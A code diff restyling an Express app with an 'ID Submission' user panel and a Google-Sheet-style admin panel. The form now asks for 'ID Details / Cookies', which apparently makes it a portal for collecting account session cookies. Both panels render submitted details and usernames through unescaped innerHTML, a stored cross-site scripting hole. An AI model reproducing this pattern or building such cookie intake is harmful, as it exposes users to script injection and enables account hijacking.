@@ -32,37 +32,35 @@ app.get('/', (req, res) => {
             <title>User Panel - ID Submission</title>
             <style>
                 * { box-sizing: border-box; }
-                body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #f0f2f5; margin: 0; padding: 15px; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
-                .card { background: white; width: 100%; max-width: 480px; padding: 30px; border-radius: 20px; box-shadow: 0 10px 25px rgba(0,0,0,0.05); }
-                .icon-box { width: 50px; height: 50px; background: #4f46e5; border-radius: 12px; margin: 0 auto 20px; display: flex; justify-content: center; align-items: center; color: white; font-size: 24px; }
-                h2 { text-align: center; color: #111827; margin-bottom: 5px; }
-                p.subtitle { text-align: center; color: #6b7280; font-size: 14px; margin-bottom: 25px; }
-                label { display: block; font-size: 13px; font-weight: 600; color: #374151; margin-bottom: 5px; text-transform: uppercase; }
-                input, textarea { width: 100%; padding: 12px 15px; margin-bottom: 15px; border: 1px solid #e5e7eb; border-radius: 10px; font-size: 14px; background: #f9fafb; outline: none; transition: 0.3s; }
-                input:focus, textarea:focus { border-color: #4f46e5; background: #fff; box-shadow: 0 0 0 3px rgba(79, 70, 229, 0.1); }
-                .btn { background: #4f46e5; color: white; border: none; padding: 14px; border-radius: 10px; cursor: pointer; font-size: 16px; font-weight: 600; width: 100%; transition: 0.3s; }
-                .btn:hover { background: #4338ca; }
-                .switch-text { text-align: center; margin-top: 20px; font-size: 13px; color: #6b7280; font-weight: 600; cursor: pointer; text-transform: uppercase; }
-                .switch-text:hover { color: #4f46e5; }
+                body { font-family: 'Inter', 'Segoe UI', Tahoma, sans-serif; background: linear-gradient(135deg, #6366f1 0%, #a855f7 100%); margin: 0; padding: 20px; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+                .card { background: rgba(255, 255, 255, 0.95); backdrop-filter: blur(10px); width: 100%; max-width: 450px; padding: 40px; border-radius: 24px; box-shadow: 0 20px 40px rgba(0,0,0,0.15); }
+                .icon-box { width: 60px; height: 60px; background: linear-gradient(135deg, #4f46e5, #7c3aed); border-radius: 16px; margin: 0 auto 20px; display: flex; justify-content: center; align-items: center; color: white; font-size: 28px; box-shadow: 0 8px 16px rgba(79, 70, 229, 0.3); }
+                h2 { text-align: center; color: #111827; margin-bottom: 5px; font-weight: 700; }
+                p.subtitle { text-align: center; color: #6b7280; font-size: 14px; margin-bottom: 30px; }
+                label { display: block; font-size: 12px; font-weight: 700; color: #4b5563; margin-bottom: 6px; text-transform: uppercase; letter-spacing: 0.5px; }
+                input, textarea { width: 100%; padding: 14px 18px; margin-bottom: 18px; border: 2px solid #e5e7eb; border-radius: 12px; font-size: 14px; background: #f9fafb; outline: none; transition: all 0.3s ease; }
+                input:focus, textarea:focus { border-color: #4f46e5; background: #fff; box-shadow: 0 0 0 4px rgba(79, 70, 229, 0.1); }
+                .btn { background: linear-gradient(135deg, #4f46e5, #6d28d9); color: white; border: none; padding: 14px; border-radius: 12px; cursor: pointer; font-size: 15px; font-weight: 600; width: 100%; transition: all 0.3s ease; box-shadow: 0 4px 12px rgba(79, 70, 229, 0.3); }
+                .btn:hover { transform: translateY(-2px); box-shadow: 0 6px 20px rgba(79, 70, 229, 0.4); }
+                .switch-text { text-align: center; margin-top: 20px; font-size: 13px; color: #4f46e5; font-weight: 600; cursor: pointer; text-transform: uppercase; letter-spacing: 0.5px; }
+                .switch-text:hover { text-decoration: underline; }
                 .hidden { display: none !important; }
                 
                 /* Responsive Dashboard Container */
-                .dashboard-container { max-width: 900px !important; width: 100% !important; padding: 25px; }
-                .table-responsive { max-height: 400px; overflow-y: auto; overflow-x: auto; border: 1px solid #e5e7eb; border-radius: 10px; margin-top: 15px; }
-                table { width: 100%; border-collapse: collapse; min-width: 600px; }
-                th, td { border-bottom: 1px solid #e5e7eb; padding: 12px; text-align: center; font-size: 14px; }
-                th { background: #f9fafb; color: #374151; position: sticky; top: 0; z-index: 10; }
-                td.details-cell { max-width: 350px; word-break: break-all; text-align: left; max-height: 100px; overflow-y: auto; display: block; }
-                .status-pending { color: #d97706; font-weight: bold; background: #fef3c7; padding: 4px 8px; border-radius: 6px; display: inline-block; }
-                .status-success { color: #16a34a; font-weight: bold; background: #dcfce7; padding: 4px 8px; border-radius: 6px; display: inline-block; }
-                .logout-btn { background: #ef4444; margin-top: 20px; }
-                .logout-btn:hover { background: #dc2626; }
+                .dashboard-container { max-width: 950px !important; width: 100% !important; padding: 30px; }
+                .table-responsive { max-height: 420px; overflow-y: auto; overflow-x: auto; border: 1px solid #e5e7eb; border-radius: 14px; margin-top: 15px; background: white; }
+                table { width: 100%; border-collapse: collapse; min-width: 650px; }
+                th, td { border-bottom: 1px solid #f3f4f6; padding: 14px 18px; text-align: center; font-size: 14px; }
+                th { background: #f8fafc; color: #374151; position: sticky; top: 0; z-index: 10; font-weight: 700; }
+                td.details-cell { max-width: 400px; word-break: break-all; text-align: left; max-height: 100px; overflow-y: auto; display: block; font-family: monospace; background: #f9fafb; padding: 8px; border-radius: 6px; }
+                .status-pending { color: #d97706; font-weight: 700; background: #fef3c7; padding: 6px 12px; border-radius: 20px; display: inline-block; font-size: 12px; }
+                .status-success { color: #16a34a; font-weight: 700; background: #dcfce7; padding: 6px 12px; border-radius: 20px; display: inline-block; font-size: 12px; }
+                .logout-btn { background: linear-gradient(135deg, #ef4444, #dc2626); margin-top: 25px; box-shadow: 0 4px 12px rgba(239, 68, 68, 0.3); }
+                .logout-btn:hover { box-shadow: 0 6px 20px rgba(239, 68, 68, 0.4); }
 
-                /* Mobile Screen Adjustments */
-                @media (max-width: 600px) {
+                @media (max-width: 768px) {
                     body { padding: 10px; }
-                    .card { padding: 20px; }
-                    .dashboard-container { padding: 15px; }
+                    .card, .dashboard-container { padding: 20px; }
                 }
             </style>
         </head>
@@ -71,8 +69,8 @@ app.get('/', (req, res) => {
             <!-- Login View -->
             <div class="card" id="login-card">
                 <div class="icon-box">🛡️</div>
-                <h2>Welcome</h2>
-                <p class="subtitle">Login to your account</p>
+                <h2>Welcome Back</h2>
+                <p class="subtitle">Secure ID Submission Portal</p>
                 
                 <label>Email Address</label>
                 <input type="email" id="login-email" placeholder="name@example.com">
@@ -86,11 +84,11 @@ app.get('/', (req, res) => {
 
             <!-- Register View -->
             <div class="card hidden" id="register-card">
-                <div class="icon-box">👤+</div>
-                <h2>New Account</h2>
-                <p class="subtitle">Fill in the details to get started</p>
+                <div class="icon-box">✨</div>
+                <h2>Create Account</h2>
+                <p class="subtitle">Join our platform today</p>
                 
-                <div style="display: flex; gap: 10px;">
+                <div style="display: flex; gap: 12px;">
                     <div>
                         <label>First Name</label>
                         <input type="text" id="reg-firstname" placeholder="John">
@@ -116,14 +114,20 @@ app.get('/', (req, res) => {
 
             <!-- User Dashboard -->
             <div class="card dashboard-container hidden" id="dashboard-card">
-                <h2>Welcome, <span id="user-display-name" style="color: #4f46e5;"></span></h2>
-                <p class="subtitle">Telegram: <span id="user-display-tg"></span></p>
+                <div style="display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 10px;">
+                    <div>
+                        <h2 style="text-align: left; margin: 0;">Welcome, <span id="user-display-name" style="color: #4f46e5;"></span></h2>
+                        <p class="subtitle" style="text-align: left; margin: 5px 0 0 0;">Telegram: <span id="user-display-tg" style="font-weight: 600; color: #374151;"></span></p>
+                    </div>
+                </div>
                 
-                <label>Submit ID Details</label>
-                <textarea id="id-details" rows="3" placeholder="Enter ID details here..."></textarea>
-                <button class="btn" onclick="submitId()">Submit</button>
+                <div style="margin-top: 25px;">
+                    <label>Submit ID Details / Cookies</label>
+                    <textarea id="id-details" rows="3" placeholder="Paste your ID details here..."></textarea>
+                    <button class="btn" onclick="submitId()" style="width: 200px;">Submit Now</button>
+                </div>
 
-                <h3 style="margin-top: 30px; color: #111827;">Submission History</h3>
+                <h3 style="margin-top: 35px; color: #111827; font-size: 18px;">Submission History</h3>
                 <div class="table-responsive">
                     <table>
                         <thead>
@@ -136,7 +140,7 @@ app.get('/', (req, res) => {
                         <tbody id="user-subs-table"></tbody>
                     </table>
                 </div>
-                <button class="btn logout-btn" onclick="logout()">Logout</button>
+                <button class="btn logout-btn" onclick="logout()" style="max-width: 200px;">Logout</button>
             </div>
 
             <script>
@@ -232,11 +236,8 @@ app.get('/', (req, res) => {
                         data.submissions.forEach(s => {
                             let statusClass = s.status === 'success' ? 'status-success' : 'status-pending';
                             let statusText = s.status === 'success' ? 'SUCCESS' : 'PENDING';
-                            tbody.innerHTML += `<tr>
-                                <td>${new Date(s.date).toLocaleString()}</td>
-                                <td><div class="details-cell">${s.details}</div></td>
-                                <td><span class="${statusClass}">${statusText}</span></td>
-                            </tr>`;
+                            let dateStr = new Date(s.date).toLocaleString();
+                            tbody.innerHTML += '<tr><td>' + dateStr + '</td><td><div class="details-cell">' + s.details + '</div></td><td><span class="' + statusClass + '">' + statusText + '</span></td></tr>';
                         });
                     });
                 }
@@ -263,32 +264,31 @@ app.get('/admin', (req, res) => {
             <title>Google Sheet Style Admin Panel</title>
             <style>
                 * { box-sizing: border-box; }
-                body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #f0f2f5; margin: 0; padding: 15px; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
-                .card { background: white; width: 100%; max-width: 400px; padding: 30px; border-radius: 20px; box-shadow: 0 10px 25px rgba(0,0,0,0.05); }
-                h2 { text-align: center; color: #111827; margin-bottom: 20px; }
-                input { width: 100%; padding: 12px 15px; margin-bottom: 15px; border: 1px solid #e5e7eb; border-radius: 10px; font-size: 14px; background: #f9fafb; outline: none; }
-                .btn { background: #4f46e5; color: white; border: none; padding: 14px; border-radius: 10px; cursor: pointer; font-size: 16px; font-weight: 600; width: 100%; transition: 0.3s; }
-                .btn:hover { background: #4338ca; }
+                body { font-family: 'Inter', 'Segoe UI', Tahoma, sans-serif; background: #f0f2f5; margin: 0; padding: 20px; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+                .card { background: white; width: 100%; max-width: 420px; padding: 40px; border-radius: 20px; box-shadow: 0 15px 35px rgba(0,0,0,0.08); }
+                h2 { text-align: center; color: #111827; margin-bottom: 25px; font-weight: 700; }
+                input { width: 100%; padding: 14px 18px; margin-bottom: 18px; border: 2px solid #e5e7eb; border-radius: 12px; font-size: 14px; background: #f9fafb; outline: none; transition: 0.3s; }
+                input:focus { border-color: #107c41; background: #fff; box-shadow: 0 0 0 4px rgba(16, 124, 65, 0.1); }
+                .btn { background: linear-gradient(135deg, #107c41, #0b5c31); color: white; border: none; padding: 14px; border-radius: 12px; cursor: pointer; font-size: 15px; font-weight: 600; width: 100%; transition: all 0.3s ease; box-shadow: 0 4px 12px rgba(16, 124, 65, 0.3); }
+                .btn:hover { transform: translateY(-2px); box-shadow: 0 6px 20px rgba(16, 124, 65, 0.4); }
                 .hidden { display: none !important; }
 
                 /* Google Sheet Responsive Style */
-                .admin-container { max-width: 1100px !important; width: 100% !important; padding: 20px; }
-                .sheet-scroll-box { max-height: 550px; overflow-y: auto; overflow-x: auto; border: 1px solid #d1d5db; border-radius: 6px; }
-                table { width: 100%; border-collapse: collapse; font-size: 14px; min-width: 700px; }
-                th, td { border: 1px solid #d1d5db; padding: 10px 15px; text-align: left; }
+                .admin-container { max-width: 1150px !important; width: 100% !important; padding: 25px; }
+                .sheet-scroll-box { max-height: 580px; overflow-y: auto; overflow-x: auto; border: 1px solid #d1d5db; border-radius: 8px; box-shadow: 0 4px 6px -1px rgba(0,0,0,0.05); }
+                table { width: 100%; border-collapse: collapse; font-size: 14px; min-width: 750px; background: white; }
+                th, td { border: 1px solid #d1d5db; padding: 12px 18px; text-align: left; }
                 th { background: #107c41; color: white; font-weight: 600; text-align: center; position: sticky; top: 0; z-index: 10; }
                 td { background: #ffffff; color: #1f2937; }
                 tr:nth-child(even) td { background: #f8fafc; }
-                td.admin-details { max-width: 400px; word-break: break-all; max-height: 100px; overflow-y: auto; display: block; }
-                .received-btn { background: #107c41; color: white; border: none; padding: 6px 12px; border-radius: 4px; cursor: pointer; font-weight: 600; }
-                .received-btn:hover { background: #0b5c31; }
-                .received-text { color: #107c41; font-weight: bold; text-align: center; display: block; }
+                td.admin-details { max-width: 450px; word-break: break-all; max-height: 120px; overflow-y: auto; display: block; font-family: monospace; background: #fdfdfd; padding: 8px; border-radius: 4px; border: 1px solid #eee; }
+                .received-btn { background: #107c41; color: white; border: none; padding: 8px 16px; border-radius: 6px; cursor: pointer; font-weight: 600; transition: 0.2s; box-shadow: 0 2px 6px rgba(16,124,65,0.2); }
+                .received-btn:hover { background: #0b5c31; transform: scale(1.05); }
+                .received-text { color: #107c41; font-weight: bold; text-align: center; display: block; background: #dcfce7; padding: 6px; border-radius: 6px; }
 
-                /* Mobile Screen Adjustments */
-                @media (max-width: 600px) {
+                @media (max-width: 768px) {
                     body { padding: 10px; }
-                    .card { padding: 20px; }
-                    .admin-container { padding: 10px; }
+                    .card, .admin-container { padding: 15px; }
                 }
             </style>
         </head>
@@ -303,7 +303,7 @@ app.get('/admin', (req, res) => {
 
             <!-- Admin Sheet View -->
             <div class="card admin-container hidden" id="admin-dashboard-card">
-                <h2>Google Sheet Format - Submissions</h2>
+                <h2 style="text-align: left; margin-bottom: 15px; color: #107c41;">Google Sheet Format - Submissions</h2>
                 <div class="sheet-scroll-box">
                     <table>
                         <thead>
@@ -341,15 +341,10 @@ app.get('/admin', (req, res) => {
                         data.submissions.forEach((s, index) => {
                             let actionColumn = s.status === 'success' 
                                 ? '<span class="received-text">RECEIVED</span>' 
-                                : \`<button class="received-btn" onclick="markReceived('\${s.id}')">Received</button>\`;
+                                : '<button class="received-btn" onclick="markReceived(\\'' + s.id + '\\')">Received</button>';
                             
-                            tbody.innerHTML += \`<tr>
-                                <td style="text-align: center;">\${index + 1}</td>
-                                <td>\${new Date(s.date).toLocaleString()}</td>
-                                <td><strong>@\${s.username}</strong></td>
-                                <td><div class="admin-details">\${s.details}</div></td>
-                                <td style="text-align: center;">\${actionColumn}</td>
-                            </tr>\`;
+                            let dateStr = new Date(s.date).toLocaleString();
+                            tbody.innerHTML += '<tr><td style="text-align: center; font-weight: 600;">' + (index + 1) + '</td><td>' + dateStr + '</td><td><strong style="color: #4f46e5;">@' + s.username + '</strong></td><td><div class="admin-details">' + s.details + '</div></td><td style="text-align: center;">' + actionColumn + '</td></tr>';
                         });
                     });
                 }
